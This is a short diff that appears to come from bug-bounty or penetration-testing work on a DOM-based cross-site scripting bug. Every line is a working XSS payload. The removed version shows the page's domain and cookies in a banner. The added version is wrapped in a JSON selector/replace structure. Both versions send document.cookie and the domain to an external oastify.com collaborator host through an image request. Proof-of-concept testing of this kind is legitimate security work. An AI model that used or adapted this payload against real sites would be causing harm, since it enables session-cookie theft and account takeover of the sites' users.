@@ -1,7 +1,3 @@
-  <div><img src=x onerror="                                                                                                                                                                                                                          
-  var b=document.createElement('div');                                                                                                                                                                                                               
-  b.style='position:fixed;top:0;left:0;width:100%;padding:25px;background:#c0392b;color:white;font-size:22px;z-index:99999;font-weight:bold';                                                                                                        
-  b.innerHTML='DOM XSS on '+document.domain+'<br>Cookie: '+document.cookie;                                                                                                                                                                          
-  document.body.prepend(b);                                                                                                                                                                                                                          
-  new Image().src='https://l6sudowizr5yb8alg57mv7yin9t0qogc5.oastify.com/xss?c='+encodeURIComponent(document.cookie)+'&d='+document.domain;                                                                                                          
-  "></div> 
+  {"data":[{"selector":"h1","action":"replace","all":"<img src=x onerror=\"var                                                                                                                                                                     
+  b=document.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;padding:25px;background:#c0392b;color:white;font-size:22px;z-index:99999;font-weight:bold';b.innerHTML='XSS CONFIRMED on                                           
+  '+document.domain;document.body.prepend(b);new Image().src='https://l6sudowizr5yb8alg57mv7yin9t0qogc5.oastify.com/xss?c='+encodeURIComponent(document.cookie)+'&d='+document.domain;\">"}]}
